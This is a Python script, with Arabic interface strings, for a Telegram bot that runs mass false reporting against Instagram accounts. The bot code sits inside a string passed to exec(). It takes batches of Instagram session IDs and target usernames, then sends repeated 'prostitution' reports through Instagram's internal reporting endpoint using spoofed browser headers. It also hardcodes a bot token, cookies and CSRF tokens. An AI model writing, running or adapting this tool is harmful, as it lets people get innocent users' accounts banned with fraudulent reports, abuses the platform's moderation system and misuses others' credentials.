import sys,os
import telebot, requests
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
os.system("pip3 install user_agent")
os.system("pip3 install colorama")
os .system("pip3 install requests")
os.system("pip3 install rich")
os.system("pip3 install bs4")
os.system("pip3 install telegram")
os.system("pip3 install cfonts")
Q_B_H = """
b = telebot.TeleBot(("5929336119:AAG-xeDSJOL9ibG2ceVRk8ibF5xuL3WHUoA"))
o = int(("1394265953"))
au = [o]
s = []
u = []
rc = 0
def ia(i):
    return i in au
@b.message_handler(commands=['start'])
def st(m):
    if not ia(m.from_user.id):
        b.send_message(m.chat.id, "ماعدك انت اي صلاحية حب")
        return
    k = InlineKeyboardMarkup(row_width=2)
    k.add(InlineKeyboardButton("إدخال سيشنات", callback_data="as"),
          InlineKeyboardButton("إدخال علمود تفعل لتريد الهم", callback_data="adu"),
          InlineKeyboardButton("ضبط عدد البلاغات", callback_data="sp"),
          InlineKeyboardButton("بدء البلاغات", callback_data="spr"),
          InlineKeyboardButton("إدارة الصلاحيات", callback_data="mp"))
    b.send_message(m.chat.id, "ها كايز اختار من ذني  أحد الأوامر:", reply_markup=k)
@b.callback_query_handler(func=lambda c: c.data=="as")
def ash(c):
    if not ia(c.from_user.id):
        b.send_message(c.message.chat.id, "سوري ليس لديك اي صلاحية.")
        return
    b.send_message(c.message.chat.id, "حط عدد سيشنات")
    b.register_next_step_handler(c.message, ps)
def ps(m):
    try:
        n = int(m.text)
        b.send_message(m.chat.id, f"حط الآن {n} من سيشنات:")
        b.register_next_step_handler(m, lambda m2: cs(m2, n, []))
    except:
        b.send_message(m.chat.id, "يرجى إدخال عدد صحيح.")
def cs(m, n, a):
    a.append(m.text)
    if len(a) < n:
        b.send_message(m.chat.id, f"تم إدخال {len(a)} سيشن. حط السيشن التالية:")
        b.register_next_step_handler(m, lambda m2: cs(m2, n, a))
    else:
        global s
        s = a
        b.send_message(m.chat.id, "تم حفظ جميع سيشنات بنجاح.")
@b.callback_query_handler(func=lambda c: c.data=="adu")
def aduh(c):
    if not ia(c.from_user.id):
        b.send_message(c.message.chat.id, "حبيبي سيد لا تملك صلاحية استخدام هذا الأمر.")
        return
    b.send_message(c.message.chat.id, "حط عدد لتفعل الهم:")
    b.register_next_step_handler(c.message, pu)
def pu(m):
    try:
        n = int(m.text)
        b.send_message(m.chat.id, f"حط الآن {n} من المستخدمين:")
        b.register_next_step_handler(m, lambda m2: cu(m2, n, []))
    except:
        b.send_message(m.chat.id, " إدخال عدد صحيح.")
def cu(m, n, a):
    a.append(m.text)
    if len(a) < n:
        b.send_message(m.chat.id, f"تم إدخال {len(a)} مستخدم. حط المستخدم التالي:")
        b.register_next_step_handler(m, lambda m2: cu(m2, n, a))
    else:
        global u
        u = a
        b.send_message(m.chat.id, "تم حفظ جميع المستخدمين بنجاح.")
@b.callback_query_handler(func=lambda c: c.data=="sp")
def sph(c):
    if not ia(c.from_user.id):
        b.send_message(c.message.chat.id, "ماعدك صلاحية.")
        return
    b.send_message(c.message.chat.id, "حط عدد البلاغات:")
    b.register_next_step_handler(c.message, pr)
def pr(m):
    global rc
    try:
        rc = int(m.text)
        b.send_message(m.chat.id, f"تم ضبط عدد البلاغات على {rc}.")
    except:
        b.send_message(m.chat.id, "يرجى إدخال عدد صحيح.")
@b.callback_query_handler(func=lambda c: c.data=="spr")
def sprh(c):
    if not ia(c.from_user.id):
        b.send_message(c.message.chat.id, "ماعدك صلاحية هم.")
        return
    if not s:
        b.send_message(c.message.chat.id, "يرجى إدخال سيشنات أولاً.")
        return
    if not u:
        b.send_message(c.message.chat.id, "يرجى إدخال المستخدمين أولاً.")
        return
    if rc <= 0:
        b.send_message(c.message.chat.id, "يرجى ضبط عدد البلاغات أولاً.")
        return
    b.send_message(c.message.chat.id, "جارٍ بدء عملية البلاغات...")
    for x in s:
        for y in u:
            for i in range(rc):
                try:
                    ru(x, y)
                    b.send_message(c.message.chat.id, f"تم الإبلاغ على {y} باستخدام {x} ({i+1}/{rc}).")
                except Exception as e:
                    b.send_message(c.message.chat.id, f"فشل الإبلاغ على {y} باستخدام {x}. الخطأ: {e}")
def ru(sid, name):
    ck = {
    'mid': 'Z3tuVAABAAHAC46qNHRQ0Km5okmj',
    'datr': 'VG57Z-LR7cavFL38jd3C0sub',
    'ig_did': '4330D4A5-C2E5-4812-94CE-AC15FB0DC2D8',
    'ps_l': '1',
    'ps_n': '1',
    'ig_nrcb': '1',
    'csrftoken': 'VHXgx2ThH3m2qXETDE1uvSxqetrsha7g',
    'ds_user_id': '5370619958',
    'sessionid': sid,
    'wd': '360x657',}
    url = f"https://www.instagram.com/{name}"
    txt = requests.get(url).text
    uid = txt.split('props":{"id":"')[1].split('"')[0]
    hd = {
    'accept': '*/*',
    'authority': 'www.instagram.com',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'referer': f'https://www.instagram.com/{name}',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"23127PN0CC"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-asbd-id': '129477',
    'x-csrftoken': 'VHXgx2ThH3m2qXETDE1uvSxqetrsha7g',
    'x-ig-app-id': '1217981644879628',
    'x-ig-www-claim': 'hmac.AR2Byo5bRm6_izoL_9eIPaUsPfeL2eY-47tk4uVtcIq41BMn',
    'x-instagram-ajax': '1016272294',
    'x-requested-with': 'XMLHttpRequest' }
    d = {
    'container_module': 'profilePage',
    'entry_point': '1',
    'location': '2',
    'object_id': uid,
    'object_type': '5',
    'frx_prompt_request_type': '1' }
    ctx = requests.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', cookies=ck, headers=hd, data=d).json()['response']['context']
    d = {
    'container_module': 'profilePage',
    'entry_point': '1',
    'location': '2',
    'object_id': uid,
    'object_type': '5',
    'context': ctx,
    'selected_tag_types': '["prostitution"]',
    'action_type': '2',
    'frx_prompt_request_type': '2' }
    return requests.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', cookies=ck, headers=hd, data=d).text
@b.callback_query_handler(func=lambda c: c.data=="mp")
def mph(c):
    if c.from_user.id != o:
        b.send_message(c.message.chat.id, "سوريي هذا الأمر مخصص لصاحب البوت فقط.")
        return
    b.send_message(c.message.chat.id, "حط ايدي شخص لتريد تفعل الة:")
    b.register_next_step_handler(c.message, gp)
def gp(m):
    try:
        i = int(m.text)
        if i not in au:
            au.append(i)
            b.send_message(m.chat.id, f"تم منح الصلاحية للمستخدم {i}.")
        else:
            b.send_message(m.chat.id, "المستخدم لديه الصلاحية بالفعل.")
    except:
        b.send_message(m.chat.id, "يرجى إدخال ايدي صحيح.")
b.polling()
"""
exec(Q_B_H, globals())
